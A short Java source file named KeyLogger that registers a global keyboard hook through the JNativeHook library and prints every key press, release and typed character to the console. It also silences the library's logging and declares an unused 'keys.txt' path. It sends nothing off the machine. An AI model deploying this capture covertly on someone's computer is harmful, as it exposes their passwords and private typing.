import java.nio.file.Path;
import java.nio.file.Paths;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

public class KeyLogger implements NativeKeyListener {

	private static final Path file = Paths.get("keys.txt");

	public static void main(String[] args) {
		init();

		try {
			GlobalScreen.registerNativeHook();
		} catch (NativeHookException e) {
			System.exit(-1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}

	private static void init() {

		// Get the logger for "org.jnativehook" and set the level to warning.
		java.util.logging.Logger logger = java.util.logging.Logger.getLogger(GlobalScreen.class.getPackage().getName());
		logger.setLevel(Level.WARNING);

		// Don't forget to disable the parent handlers.
		logger.setUseParentHandlers(false);
	}

	public void nativeKeyPressed(NativeKeyEvent e) {
		System.out.println("nativeKeyPressed -> getKeyCode " + e.getKeyCode());
		System.out.println("nativeKeyPressed -> getKeyChar " + e.getKeyChar());
		System.out.println("nativeKeyPressed -> getRawCode " + e.getRawCode());
	}

	public void nativeKeyReleased(NativeKeyEvent e) {
		System.out.println("nativeKeyReleased -> getKeyCode " + e.getKeyCode());
		System.out.println("nativeKeyReleased -> getKeyChar " + e.getKeyChar());
		System.out.println("nativeKeyReleased -> getRawCode " + e.getRawCode());
	}

	public void nativeKeyTyped(NativeKeyEvent e) {
		System.out.println("nativeKeyTyped -> getKeyCode " + e.getKeyCode());
		System.out.println("nativeKeyTyped -> getKeyChar " + e.getKeyChar());
		System.out.println("nativeKeyTyped -> getRawCode " + e.getRawCode());
	}
}
